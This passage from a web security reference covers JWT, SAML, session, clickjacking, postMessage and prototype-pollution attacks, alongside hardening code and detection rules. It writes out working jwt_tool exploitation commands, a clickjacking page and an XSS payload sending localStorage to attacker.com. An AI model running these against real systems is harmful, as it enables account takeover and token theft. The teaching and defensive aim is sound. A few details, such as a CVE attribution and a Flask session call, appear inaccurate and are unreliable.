- *Missing PKCE enforcement:* If the server doesn't require PKCE, an attacker can omit PKCE parameters entirely and exchange an intercepted code directly.

**Implicit flow (`response_type=token`).** The access token is returned in the URL fragment. This flow is deprecated because the token is exposed in browser history, referrer headers, and to JavaScript in the page. The authorization code flow with PKCE is preferred for all client types.

**Token theft via open redirectors.** If the client application has an open redirect vulnerability, an attacker can chain: `authorize?redirect_uri=https://client.com/redirect?url=https://attacker.com` → authorization code or token leaks to attacker via the `Referer` header or URL fragment.

**Scope escalation.** The attacker requests elevated scopes (`scope=admin`) that the authorization server grants without explicit user consent or that the user doesn't notice. Server must display requested scopes clearly and enforce scope restrictions per-client.

### 4.3 JWT attacks

**`none` algorithm bypass.** Some JWT libraries accept `alg: "none"` (no signature). The attacker creates a token with `alg: "none"` and an empty signature. If the library doesn't reject `none`, the token is accepted without verification. Mitigation: explicitly reject `alg: "none"` and enforce an allowlist of accepted algorithms.

**Algorithm confusion (RS256 → HS256).** If the server verifies JWTs and supports both RS256 (asymmetric: signed with private key, verified with public key) and HS256 (symmetric: signed and verified with the same key), an attacker can: take the server's RS256 public key (often publicly available via JWKS endpoint), forge a JWT signed with HS256 using the public key as the symmetric secret, and send it. If the server reads the `alg` header and uses HS256 verification with the public key, the signature validates. Mitigation: the server must enforce the expected algorithm per key, not trust the token's `alg` header.

**`kid` header injection.** The `kid` (key ID) header in a JWT identifies which key to use for verification. If the server uses `kid` in a database query or file path without sanitization:
- *SQL injection:* `"kid": "1' UNION SELECT 'attacker-controlled-secret'--"` — the server retrieves the attacker's key from the injected query.
- *Path traversal:* `"kid": "../../../dev/null"` — `/dev/null` contains empty bytes; the server uses an empty key for HMAC verification, and the attacker signs with an empty key.
- *Directory traversal to known file:* `"kid": "../../../proc/sys/kernel/hostname"` — the attacker signs with the content of a predictable file.

**`jku`/`jwk` header injection.** `jku` (JWK Set URL) tells the server where to fetch the verification key set. If the server fetches keys from the URL in `jku` without validating against an allowlist, the attacker can point `jku` at their server hosting a key pair they control. `jwk` (embedded JWK) provides the verification key directly in the token header — the server verifies the token with the key the attacker chose.

**Exploitation with jwt_tool:**
```bash
# Install
pip3 install pyjwt[crypto] requests
git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool

# Enumerate vulnerabilities — automated scan
python3 jwt_tool.py <JWT_TOKEN> -M at  # All Tests mode

# None algorithm attack
python3 jwt_tool.py <JWT_TOKEN> -X a   # alg:none bypass

# Key confusion (RS256 → HS256) — requires the public key
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public_key.pem

# kid injection — SQL injection
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# jku injection — point to attacker JWKS
python3 jwt_tool.py <JWT_TOKEN> -X s -ju https://attacker.com/.well-known/jwks.json

# Tamper claims
python3 jwt_tool.py <JWT_TOKEN> -T -S hs256 -p "secret" \
  -pc sub -pv admin -pc role -pv superadmin
```

**Burp Suite JWT extension:**
1. Install "JSON Web Tokens" extension from BApp Store.
2. Intercept requests with JWT in `Authorization` header.
3. The extension's tab shows decoded header, payload, and signature.
4. Modify claims (e.g., `sub`, `role`, `admin: true`), re-sign with a known key or test `none` algorithm.
5. Forward the modified request and observe server behavior.

**Hardening — JWT verification:**
```python
# Python (PyJWT) — explicit algorithm enforcement
import jwt
decoded = jwt.decode(
    token,
    public_key,
    algorithms=["RS256"],  # NEVER accept list from token header
    options={"require": ["exp", "iat", "sub"]},
    issuer="https://auth.example.com",
    audience="https://api.example.com"
)
```

```js
// Node.js (jsonwebtoken) — explicit algorithm
const jwt = require('jsonwebtoken');
const decoded = jwt.verify(token, publicKey, {
  algorithms: ['RS256'],  // Enforce expected algorithm
  issuer: 'https://auth.example.com',
  audience: 'https://api.example.com',
  clockTolerance: 30, // seconds
});
```

```java
// Spring Security — NimbusJwtDecoder with explicit algorithm
import org.springframework.security.oauth2.jwt.NimbusJwtDecoder;
NimbusJwtDecoder decoder = NimbusJwtDecoder
    .withPublicKey(rsaPublicKey)
    .signatureAlgorithm(SignatureAlgorithm.RS256)  // Enforce RS256
    .build();
decoder.setJwtValidator(new DelegatingOAuth2TokenValidator<>(
    JwtValidators.createDefaultWithIssuer("https://auth.example.com"),
    new JwtClaimValidator<>("aud", aud -> aud.contains("https://api.example.com"))
));
```

```ruby
# Rails — ruby-jwt gem with explicit algorithm
require 'jwt'
decoded = JWT.decode(
  token,
  public_key,
  true,  # verify signature
  {
    algorithm: 'RS256',  # Enforce expected algorithm
    iss: 'https://auth.example.com',
    verify_iss: true,
    aud: 'https://api.example.com',
    verify_aud: true,
  }
)
```

**Real-world CVEs:**
- **CVE-2015-9235 — JWT `alg: none` in multiple libraries.** The `jsonwebtoken` (Node.js), `php-jwt`, `pyjwt`, and `ruby-jwt` libraries all accepted `alg: "none"` by default, allowing complete signature bypass. This affected any application using these libraries without explicitly rejecting the `none` algorithm.
- **Auth0 RS256/HS256 confusion (2015).** Auth0's authentication library allowed algorithm switching from RS256 to HS256. An attacker could download Auth0's public key (available via JWKS endpoint), sign a forged token using HS256 with the public key as the HMAC secret, and authenticate as any user. Auth0 issued a security advisory and patched the library to enforce server-side algorithm selection.
- **CVE-2018-0114 — Cisco node-jose `jwk` header injection.** The `node-jose` library used the `jwk` header embedded in the JWT itself for verification, allowing an attacker to embed their own public key in the token and self-sign it.

### 4.4 SAML

SAML (Security Assertion Markup Language) is an XML-based SSO protocol. The Identity Provider (IdP) produces a signed XML assertion containing the user's identity; the Service Provider (SP) validates the signature and grants access.

**XML Signature Wrapping.** The XML Signature standard signs a specific element identified by a `URI` reference. An attacker can move the signed element to a non-processed location in the XML document and inject a forged element in the original location. The signature validates (it finds the signed element by URI), but the SP processes the forged element (it looks at the document structure). The result: the SP accepts a forged assertion.

**Exploitation with SAMLRaider (Burp extension):**
1. Install SAMLRaider from BApp Store.
2. Intercept a SAML Response in Burp Proxy.
3. Use the SAMLRaider tab → "XSW Attacks" — it generates all 8 known XSW variants automatically.
4. For each variant: forward the modified response and check if the SP accepts it.
5. If accepted: modify the `NameID` in the unsigned (forged) assertion to impersonate any user.

**XML comment injection.** Some XML parsers treat `user@evil.com<!---->@legitimate.com` as `user@evil.com` (ignoring the comment and everything after), while the signature validation processes the full string. This was the basis for CVE-2017-11427 (OneLogin python-saml) and CVE-2018-0489 (Shibboleth) — the SP extracted a different identity from the assertion than what was signed.

**Canonicalization attacks.** XML has multiple canonicalization algorithms (C14N, Exclusive C14N) used to normalize the XML before signing. Differences between the canonicalization the signer used and the one the verifier uses can allow an attacker to modify the XML in ways that are invisible to one algorithm but meaningful to the other.

**Assertion replay.** A valid assertion intercepted in transit can be replayed against the SP. Mitigations: `NotOnOrAfter` (expiration), `InResponseTo` (ties the assertion to a specific authentication request), and assertion ID tracking (reject assertions with previously-seen IDs).

**Detection — Splunk query for SAML anomalies:**
```spl
index=auth sourcetype=saml
| eval assertion_age=now()-strptime(NotOnOrAfter, "%Y-%m-%dT%H:%M:%SZ")
| where assertion_age > 300
| table _time, src_ip, NameID, InResponseTo, assertion_age
```

**Real-world CVEs:**
- **CVE-2017-11427 — OneLogin python-saml:** XML comment injection allowed authentication bypass. An attacker could log in as any user by inserting an XML comment into the `NameID` element.
- **CVE-2018-0489 — Shibboleth:** Same class of XML comment injection, affecting Shibboleth Identity Provider.
- **CVE-2019-3465 — ConnectWise (formerly ScreenConnect):** SAML signature wrapping allowed unauthenticated administrative access.

### 4.5 Session management attacks

**Session fixation.** The attacker sets a known session ID in the victim's browser before the victim authenticates. After authentication, the session is promoted to an authenticated session — and the attacker already knows the ID. The attacker can set the session via: URL parameter (`?JSESSIONID=known-value`), cookie injection (via XSS on a subdomain, cookie tossing, or HTTP header injection), or meta-tag injection.

Mitigation: regenerate the session ID upon successful authentication. Every framework supports this:
```python
# Django — automatic on login
from django.contrib.auth import login
login(request, user)  # session ID regenerated internally

# Flask
from flask import session
session.regenerate()  # or session.clear() + repopulate
```

```java
// Spring Security — automatic by default
// SessionFixationProtection.migrateSession (default)
http.sessionManagement(s -> s.sessionFixation().migrateSession());
```

Express (express-session):
```js
app.post('/login', (req, res) => {
  // After successful authentication:
  req.session.regenerate((err) => {
    if (err) return next(err);
    req.session.userId = user.id;
    res.redirect('/dashboard');
  });
});
```

Rails:
```ruby
# SessionsController
def create
  user = User.authenticate(params[:email], params[:password])
  if user
    reset_session  # Regenerate session ID — prevents fixation
    session[:user_id] = user.id
    redirect_to dashboard_path
  end
end
```

**Session prediction.** If session IDs are generated with insufficient randomness (sequential, timestamp-based, weak PRNG), an attacker can predict valid session IDs. Use CSPRNG with at least 128 bits of entropy.

**Concurrent session abuse.** Multiple active sessions for the same user can indicate credential sharing or compromise. Implement session limits:
```java
// Spring Security — max 1 concurrent session
http.sessionManagement(s -> s
    .maximumSessions(1)
    .maxSessionsPreventsLogin(true));
```

**Detection — session fixation (Sigma rule):**
```yaml
title: Session Fixation — Same Session ID Before and After Authentication
logsource:
  category: webserver
  product: any
detection:
  selection:
    cs_uri_stem|contains: "/login"
    sc_status: 200
  filter_session_regen:
    cs_cookie|re: "session=[a-f0-9]{32}"
  condition: selection and filter_session_regen
  # Alert when Set-Cookie in response contains the same session ID as the request
level: high
```

**Detection — concurrent sessions (Splunk):**
```spl
index=auth sourcetype=app_auth action=login
| stats dc(src_ip) as unique_ips, values(src_ip) as ips by user
| where unique_ips > 3
| table user, unique_ips, ips
```

### 4.6 WebAuthn / FIDO2

WebAuthn provides phishing-resistant authentication using public-key cryptography and hardware authenticators. The authenticator generates a keypair during registration; the private key never leaves the device. Authentication involves signing a challenge from the server, binding the signature to the origin (the `rpId` — relying party identifier).

**`collectedClientData`**: JSON structure containing the challenge, the origin, and the type (`webauthn.get` or `webauthn.create`). The origin binding prevents phishing: even if the user is tricked into authenticating on `evil.com`, the signature includes `evil.com` as the origin, and the legitimate server (`real.com`) rejects it because the origin doesn't match.

**`authData`**: binary structure containing the `rpIdHash` (SHA-256 of the relying party ID), flags (user present, user verified, attested credential data present), a signature counter (detects cloned authenticators), and optional attested credential data (for registration).

WebAuthn's security model is significantly stronger than password-based or OTP-based authentication because the credential is origin-bound and phishing-resistant by construction.

**Implementation considerations:**
- `rpId` should match the site's registrable domain (not a subdomain) to allow credential use across subdomains.
- The signature counter should be validated server-side; a counter that decreases indicates a cloned authenticator.
- Attestation verification (checking the authenticator model) is optional for most deployments but required in high-security contexts (government, finance).

---

## 5. Clickjacking

### 5.1 Mechanism

Clickjacking (UI redressing) embeds the target application in a transparent or disguised `<iframe>` on the attacker's page. The user interacts with what they perceive as the attacker's UI, but their clicks/taps are actually hitting elements on the invisible target page. The victim unknowingly performs actions on the target application (changing settings, granting permissions, initiating transfers).

### 5.2 Attack techniques

**Basic transparent overlay:**
```html
<style>
  iframe {
    position: absolute;
    top: 0; left: 0;
    width: 500px; height: 300px;
    opacity: 0.0001;  /* invisible but still captures clicks */
    z-index: 10;
  }
  .bait {
    position: absolute;
    top: 120px; left: 200px; /* aligned over the target's "Confirm" button */
    z-index: 1;
  }
</style>
<div class="bait"><button>Click to claim prize!</button></div>
<iframe src="https://target.com/settings/delete-account"></iframe>
```

**Drag-and-drop UI redressing.** The attacker overlays a drag source on the visible page and a drop target on the hidden iframe. The victim drags what they think is a game element but actually moves data into a form field on the target page (e.g., pasting the attacker's email into an "authorized email" field).

**Cursor hijacking.** The attacker offsets the visible cursor from the actual pointer position using CSS transforms on a custom cursor image. The user clicks where they see the cursor, but the actual click lands elsewhere — on the target iframe.

**Touch-based clickjacking (mobile).** On mobile devices, touch events can be intercepted. The attacker presents a full-screen overlay and uses `touchstart`/`touchend` events to redirect taps to the hidden iframe. Mobile browsers have fewer visual indicators of framing.

**Frame-busting bypass.** Legacy defense used JavaScript frame-busting:
```js
if (top !== self) { top.location = self.location; }
```
Bypasses:
- `sandbox` attribute on the iframe prevents the framed page's JavaScript from executing: `<iframe sandbox="allow-forms" src="https://target.com">` — the frame-busting script is blocked but form submissions still work.
- `onbeforeunload` handler on the framing page can cancel the navigation.
- Double-framing: `attacker.com` frames `proxy.com` which frames `target.com` — the frame-busting script navigates `top` to `target.com`, but the middle frame catches it.

### 5.3 Defenses

**`X-Frame-Options` header (legacy):**
- `DENY` — page cannot be framed by anyone.
- `SAMEORIGIN` — page can be framed only by same-origin pages.
- `ALLOW-FROM https://trusted.com` — only Chrome never supported this value; use CSP `frame-ancestors` instead.

**CSP `frame-ancestors` (modern):**
```
Content-Security-Policy: frame-ancestors 'self' https://partner.example.com
```
- `'none'` — equivalent to `X-Frame-Options: DENY`.
- `'self'` — same origin only.
- Specific origins — explicit allowlist.

`frame-ancestors` supersedes `X-Frame-Options`. Set both for backward compatibility with older browsers.

**Framework configuration:**

Express:
```js
app.use(helmet.frameguard({ action: 'deny' }));
// or via CSP
app.use(helmet.contentSecurityPolicy({
  directives: { frameAncestors: ["'none'"] }
}));
```

Django:
```python
# settings.py
X_FRAME_OPTIONS = 'DENY'  # default
# Plus CSP via django-csp
CSP_FRAME_ANCESTORS = ("'none'",)
```

Spring Security:
```java
// X-Frame-Options DENY is the default in Spring Security
http.headers(h -> h
    .frameOptions(fo -> fo.deny())
    .contentSecurityPolicy(csp -> csp
        .policyDirectives("frame-ancestors 'none'"))
);
```

Rails:
```ruby
# config/application.rb — default since Rails 6
config.action_dispatch.default_headers['X-Frame-Options'] = 'DENY'
# For CSP via secure_headers gem:
SecureHeaders::Configuration.default do |config|
  config.csp = { frame_ancestors: %w['none'] }
end
```

NGINX:
```nginx
add_header X-Frame-Options "DENY" always;
add_header Content-Security-Policy "frame-ancestors 'none'" always;
```

**Real-world incidents:**
- **Facebook likejacking (2009–2011):** Attackers used clickjacking to trick users into "liking" pages, spreading spam virally. Facebook deployed frame-busting JavaScript and later `X-Frame-Options`.
- **Twitter "Don't Click" worm (2009):** A clickjacking attack made users unknowingly tweet a link, which spread as a worm across the platform. Twitter responded with `X-Frame-Options` headers.
- **Adobe Flash clickjacking (2008):** Clickjacking via transparent Flash overlays allowed attackers to enable webcam/microphone access without user knowledge. This was one of the earliest high-profile clickjacking demonstrations (by Jeremiah Grossman and Robert Hansen).

**Nuclei template:**
```yaml
id: clickjacking-frameable
info:
  name: Page Frameable - Clickjacking Risk
  severity: medium
  tags: clickjacking
http:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "X-Frame-Options"
        negative: true
      - type: word
        part: header
        words:
          - "frame-ancestors"
        negative: true
```

---

## 6. Client-side storage attacks

### 6.1 localStorage / sessionStorage theft via XSS

`localStorage` and `sessionStorage` are accessible to any JavaScript running in the same origin. An XSS vulnerability in the application grants the attacker full read/write access:

```js
// XSS payload to exfiltrate all localStorage
new Image().src = 'https://attacker.com/log?data=' +
  encodeURIComponent(JSON.stringify(localStorage));

// Exfiltrate sessionStorage
fetch('https://attacker.com/log', {
  method: 'POST',
  body: JSON.stringify(Object.fromEntries(
    Object.keys(sessionStorage).map(k => [k, sessionStorage.getItem(k)])
  ))
});
```

Storing JWTs or sensitive tokens in `localStorage` is high-risk because any XSS in the origin can steal them. `HttpOnly` cookies are not accessible to JavaScript and are preferred for session tokens.

### 6.2 IndexedDB data extraction

IndexedDB follows the same-origin policy. XSS allows full database enumeration:
```js
// List all IndexedDB databases (Chrome)
const dbs = await indexedDB.databases();
for (const db of dbs) {
  const conn = await new Promise((resolve, reject) => {
    const req = indexedDB.open(db.name, db.version);
    req.onsuccess = () => resolve(req.result);
    req.onerror = () => reject(req.error);
  });
  for (const store of conn.objectStoreNames) {
    const tx = conn.transaction(store, 'readonly');
    const all = await new Promise(r => {
      tx.objectStore(store).getAll().onsuccess = e => r(e.target.result);
    });
    // Exfiltrate 'all'
  }
}
```

### 6.3 Cookie theft and manipulation

**Domain/path scope abuse.** A cookie set with `Domain=.example.com` is sent to all subdomains. An attacker controlling `evil.example.com` (via subdomain takeover, XSS on a subdomain, or a user-controlled subdomain like `username.example.com`) can read cookies scoped to the parent domain.

**Cookie tossing.** An attacker controlling a subdomain can *set* cookies for the parent domain. If the target application uses the double-submit cookie CSRF defense, the attacker sets their own CSRF cookie value on the parent domain and includes the matching value in the form — bypassing the protection.

```js
// From evil.example.com — sets cookie on .example.com
document.cookie = "csrf_token=attacker-value; domain=.example.com; path=/";
```

**`__Host-` and `__Secure-` cookie prefixes.** These browser-enforced prefixes prevent cookie tossing:
- `__Host-` prefix: cookie must be set with `Secure`, must not have a `Domain` attribute, and must have `Path=/`. This binds the cookie to the exact host origin — no subdomain can set or override it.
- `__Secure-` prefix: cookie must be set with `Secure` flag.

```
Set-Cookie: __Host-session=abc123; Secure; Path=/; HttpOnly; SameSite=Strict
```

### 6.4 Web Storage forensics (browser DevTools)

**Chrome DevTools:**
- Application tab → Storage → Local Storage / Session Storage / IndexedDB / Cookies.
- View, edit, delete entries.
- Application tab → Clear Storage → clear all data for origin.

**Firefox DevTools:**
- Storage Inspector (Shift+F9) — shows all storage types.
- Filter and search across storage entries.

**Forensic extraction (command-line):**
```bash
# Chrome localStorage is in LevelDB format
# Location: ~/.config/google-chrome/Default/Local Storage/leveldb/
python3 -c "
import plyvel
db = plyvel.DB('$HOME/.config/google-chrome/Default/Local Storage/leveldb/')
for key, value in db:
    print(key, value)
"
```

---

## 7. PostMessage vulnerabilities

### 7.1 Mechanism

`window.postMessage()` enables cross-origin communication between windows (iframes, popups, parent frames). The sender specifies a target origin; the receiver gets a `MessageEvent` with an `origin` property identifying the sender.

### 7.2 Origin validation bypass

**Missing origin check — critical vulnerability:**
```js
// VULNERABLE — accepts messages from any origin
window.addEventListener('message', (e) => {
  document.getElementById('output').innerHTML = e.data;  // XSS sink
});

// CORRECT — validate origin
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://trusted.example.com') return;
  // process e.data safely
});
```

**Weak origin validation:**
```js
// VULNERABLE — substring match
if (e.origin.indexOf('example.com') > -1) { /* process */ }
// Bypassed by: https://example.com.attacker.com

// VULNERABLE — endsWith
if (e.origin.endsWith('.example.com')) { /* process */ }
// Bypassed by: https://evil-example.com (no, this is safe)
// But bypassed by: setting up attacker.example.com if subdomain takeover exists

// CORRECT — exact match
if (e.origin !== 'https://app.example.com') return;
```

### 7.3 Prototype pollution via postMessage

If the receiver processes the message data with an unsafe deep-merge or `Object.assign`-like operation:
```js
window.addEventListener('message', (e) => {
  // Deep merge e.data into config — vulnerable to prototype pollution
  merge(config, JSON.parse(e.data));
});

// Attacker sends:
target.postMessage('{"__proto__":{"isAdmin":true}}', '*');
// Now Object.prototype.isAdmin === true — affects all objects
```

If the application later checks `user.isAdmin` on an object that doesn't have its own `isAdmin` property, the prototype-polluted value `true` is read.

### 7.4 Detection

**Burp Suite:** Search the target application's JavaScript for `addEventListener('message'` or `onmessage` handlers. Check if the handler validates `e.origin`. Use Burp's Collaborator with a framing page to test.

**Static analysis pattern (grep):**
```bash
grep -rn "addEventListener.*message" --include="*.js" --include="*.ts" .
grep -rn "onmessage" --include="*.js" --include="*.ts" .
grep -rn "postMessage" --include="*.js" --include="*.ts" .
```

---

## 8. Browser security headers

### 8.1 Full header matrix

| Header | Value | What it prevents |
|--------|-------|------------------|
| `Content-Security-Policy` | `script-src 'nonce-...' 'strict-dynamic'; object-src 'none'; base-uri 'self'` | XSS, code injection, plugin-based attacks |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | SSL stripping, downgrade attacks |
| `X-Content-Type-Options` | `nosniff` | MIME-type sniffing (treating HTML as script) |
| `X-Frame-Options` | `DENY` | Clickjacking (legacy; use `frame-ancestors`) |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Information leakage via `Referer` header |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=()` | Unauthorized access to device APIs |
| `Cross-Origin-Embedder-Policy (COEP)` | `require-corp` | Prevents loading cross-origin resources without explicit opt-in |
| `Cross-Origin-Opener-Policy (COOP)` | `same-origin` | Isolates browsing context group — prevents Spectre-class leaks via `window` references |
| `Cross-Origin-Resource-Policy (CORP)` | `same-origin` or `same-site` | Prevents other origins/sites from loading this resource |
| `X-DNS-Prefetch-Control` | `off` | Prevents DNS prefetch leaking visited URLs to DNS resolver |
| `X-Permitted-Cross-Domain-Policies` | `none` | Blocks Flash/Acrobat cross-domain policy files |

### 8.2 COEP / COOP / CORP deep dive

These three headers work together to enable `crossOriginIsolated` state, which is required for `SharedArrayBuffer` and high-resolution timers — but also provides strong Spectre mitigations.

**COOP (`Cross-Origin-Opener-Policy`).** Controls the browsing context group. `same-origin` ensures that the document's window cannot be referenced by cross-origin windows (popups, openers). This breaks `window.opener` references from cross-origin pages, preventing Spectre-based cross-origin data leaks through shared process resources.

**COEP (`Cross-Origin-Embedder-Policy`).** `require-corp` means every resource loaded by the page must either be same-origin or explicitly opt in via `Cross-Origin-Resource-Policy` header (or CORS). This prevents the page from loading cross-origin resources that didn't consent, which could be exploited by Spectre to read their content from the shared process memory.

**CORP (`Cross-Origin-Resource-Policy`).** Set on individual resources to indicate who may embed them: `same-origin`, `same-site`, or `cross-origin`. Without CORP, resources loaded cross-origin into a COEP-enabled page will be blocked.

**Enabling crossOriginIsolated:**
```
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

Verify in JavaScript: `self.crossOriginIsolated === true`.

### 8.3 HSTS deep dive

**Mechanism.** `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` instructs the browser to: (1) convert all future HTTP requests to HTTPS before sending them (prevents SSL stripping), (2) refuse to connect if the certificate is invalid (no user override for cert errors), (3) apply to all subdomains if `includeSubDomains` is present.

**HSTS preload.** The `preload` directive requests inclusion in the browser's hardcoded HSTS preload list (maintained at `hstspreload.org`). Once included, the browser enforces HTTPS even on the first visit (before receiving the header). This closes the first-visit vulnerability window.

**Attack scenario without HSTS:** An attacker on the same network (coffee shop, corporate LAN) uses ARP spoofing + sslstrip to downgrade HTTPS to HTTP. The victim's browser sends credentials over plaintext. HSTS prevents this by refusing the HTTP connection entirely.

**Hardening — NGINX:**
```nginx
server {
    listen 443 ssl;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
    add_header Cross-Origin-Opener-Policy "same-origin" always;
    add_header Cross-Origin-Embedder-Policy "require-corp" always;
    add_header Content-Security-Policy "script-src 'self' 'strict-dynamic' 'nonce-$request_id'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'" always;
}
```

### 8.4 Security headers audit

**Nuclei template — missing security headers:**
```yaml
id: security-headers-missing
info:
  name: Missing Security Headers
  severity: info
  tags: headers,best-practices
http:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers-condition: or
    matchers:
      - type: word
        part: header
        words:
          - "Strict-Transport-Security"
        negative: true
      - type: word
        part: header
        words:
          - "X-Content-Type-Options"
        negative: true
      - type: word
        part: header
        words:
          - "Content-Security-Policy"
        negative: true
```

**Browser DevTools check:**
- Network tab → select the document request → Headers tab → Response Headers.
- Console: `fetch('/').then(r => r.headers.forEach((v, k) => console.log(k, v)))`.

**curl audit script:**
```bash
#!/bin/bash
URL="$1"
HEADERS=$(curl -s -D- -o/dev/null "$URL")
for H in "Strict-Transport-Security" "Content-Security-Policy" \
         "X-Content-Type-Options" "X-Frame-Options" \
         "Referrer-Policy" "Permissions-Policy" \
         "Cross-Origin-Opener-Policy" "Cross-Origin-Embedder-Policy"; do
  if echo "$HEADERS" | grep -qi "$H"; then
    echo "[OK] $H present"
  else
    echo "[MISSING] $H"
  fi
done
```

---

## 9. Prototype pollution

### 9.1 Mechanism

JavaScript's prototype chain means all objects inherit from `Object.prototype`. If an attacker can set properties on `Object.prototype` (via `__proto__`, `constructor.prototype`, or deep-merge gadgets), every object in the application inherits those properties — unless the object has its own property with the same name.

### 9.2 Sources

- **URL parameters:** `?__proto__[isAdmin]=true` parsed by `qs`, `query-string`, or custom parsers.
- **JSON body:** `{"__proto__": {"isAdmin": true}}` processed by unsafe deep-merge.
- **PostMessage:** cross-origin message with polluted object (see §7.3).
- **Client-side URL parsing:** `location.hash` parsed into objects.

### 9.3 Prototype pollution → XSS chains

If a framework or library reads a property from an object and uses it in a DOM sink, prototype pollution can trigger XSS without direct script injection:

```js
// If Object.prototype.innerHTML is polluted:
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
// Any code that does element.innerHTML = obj.someProperty
// where obj doesn't have 'someProperty' will read the polluted value
```

jQuery gadgets, lodash `_.template`, and Handlebars have known prototype pollution → XSS chains.

### 9.4 Detection and hardening

**Detection (static analysis):**
```bash
# Find unsafe deep-merge patterns
grep -rn "merge\|extend\|assign\|deepCopy" --include="*.js" --include="*.ts" . \
  | grep -v node_modules | grep -v "Object.freeze"
```

**Hardening:**
```js
// Reject __proto__ in input parsing
function safeParse(input) {
  return JSON.parse(input, (key, value) => {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      throw new Error('Prototype pollution attempt blocked');
    }
    return value;
  });
}

// Object.create(null) — no prototype chain
const safeConfig = Object.create(null);

// Object.freeze(Object.prototype) — nuclear option, may break libraries
```

**Real-world CVEs:**
- **CVE-2019-10744 — lodash prototype pollution.** `lodash.defaultsDeep`, `lodash.merge`, and `lodash.mergeWith` allowed prototype pollution via crafted objects. Affected lodash < 4.17.12. Given lodash's ubiquity (downloaded >40M times/week on npm), this was one of the most impactful client-side prototype pollution CVEs.
- **CVE-2021-23440 — set-value prototype pollution.** The `set-value` npm package (used by hundreds of downstream packages) allowed `Object.prototype` pollution via crafted property paths, enabling XSS chains in applications that consumed polluted properties in DOM sinks.
- **CVE-2020-28469 — glob-parent ReDoS + prototype pollution chain.** `glob-parent` < 5.1.2 had a regex denial-of-service, but the broader `minimatch`/`glob` ecosystem also exposed prototype pollution vectors through deep object construction from glob patterns.

---

## 10. Comprehensive detection and monitoring

### 10.1 SIEM correlation rules

**Multi-vector client-side attack detection (Splunk):**
```spl
index=web sourcetype=access_combined
| eval attack_type=case(
    match(_raw, "(?i)(<script|javascript:|on\w+=)"), "XSS",
    match(_raw, "(?i)(Origin:\s*https?://(?!legitimate))"), "CORS_ABUSE",
    match(_raw, "(?i)(__proto__|constructor\[|prototype\[)"), "PROTO_POLLUTION",
    true(), "NONE"
  )
| where attack_type != "NONE"
| stats count by src_ip, attack_type, uri_path
| where count > 3
| sort -count
```

**Elasticsearch / ELK query for XSS attempts:**
```json
{
  "query": {
    "bool": {
      "should": [
        {"regexp": {"request.uri": ".*<script.*"}},
        {"regexp": {"request.uri": ".*javascript:.*"}},
        {"regexp": {"request.uri": ".*on(error|load|click|focus)=.*"}}
      ],
      "minimum_should_match": 1
    }
  }
}
```

### 10.2 CSP violation reporting

```
Content-Security-Policy: ...; report-uri /csp-report; report-to csp-endpoint
Report-To: {"group":"csp-endpoint","max_age":86400,"endpoints":[{"url":"/csp-report"}]}
```

CSP violation reports contain: `document-uri`, `violated-directive`, `blocked-uri`, `source-file`, `line-number`. A spike in violations indicates either an attack attempt or a CSP misconfiguration affecting legitimate resources.

**Report analysis query (Splunk):**
```spl
index=csp_reports
| stats count by violated_directive, blocked_uri, document_uri
| sort -count
| head 20
```

### 10.3 ModSecurity CRS — comprehensive client-side rules

```
# Block reflected input in response (reflected XSS detection)
SecRule RESPONSE_BODY "@containsWord %{ARGS:q}" \
    "id:950001,phase:4,block,msg:'Potential Reflected XSS',\
    severity:'CRITICAL',tag:'OWASP_CRS/REFLECTED_XSS'"

# Block CORS header injection attempts
SecRule REQUEST_HEADERS:Origin "@rx ^https?://(.*\.)?(evil|attacker|malicious)\." \
    "id:950002,phase:1,block,msg:'Suspicious CORS Origin'"

# Rate-limit authentication endpoints
SecRule REQUEST_URI "@beginsWith /api/auth" \
    "id:950003,phase:1,pass,nolog,\
    setvar:ip.auth_attempts=+1,\
    expirevar:ip.auth_attempts=60"
SecRule IP:AUTH_ATTEMPTS "@gt 10" \
    "id:950004,phase:1,block,msg:'Auth endpoint rate limit exceeded'"
```

---

## 11. Web application authentication deep dive

This section extends the JWT attack surface from §4.3, session management from §4.5, and WebAuthn fundamentals from §4.6 with implementation-depth coverage of authentication mechanisms, credential security, and multi-factor authentication.

### 11.1 Session management — cookie security attributes

Beyond the `__Host-` and `__Secure-` prefixes covered in §6.3, production session cookies require a full attribute stack:

```http
Set-Cookie: __Host-sid=<token>; Secure; Path=/; HttpOnly; SameSite=Lax; Max-Age=3600
```

**Attribute breakdown:**

| Attribute | Effect | Omission risk |
|-----------|--------|---------------|
| `Secure` | Cookie sent only over HTTPS | Cookie leaks over plaintext on mixed-content pages |
| `HttpOnly` | Inaccessible to `document.cookie` | XSS can steal the session token directly |
| `SameSite=Strict` | Cookie not sent on any cross-site request (including top-level navigations) | Breaks OAuth redirects and inbound links that require an authenticated state |
| `SameSite=Lax` | Cookie sent on top-level navigations (GET) but not on cross-site subresource requests or POST forms | Default in modern browsers; adequate for most applications |
| `SameSite=None; Secure` | Cookie sent on all cross-site requests | Required only for legitimate cross-site embedding (e.g., embedded widgets); requires `Secure` |
| `__Host-` prefix | Binds cookie to exact host, `Secure`, no `Domain`, `Path=/` | Without this, a subdomain attacker can override the cookie via cookie tossing (§6.3) |
| `Max-Age` / `Expires` | Limits cookie lifetime | Session cookies persist until browser close; persistent cookies must have bounded lifetimes |

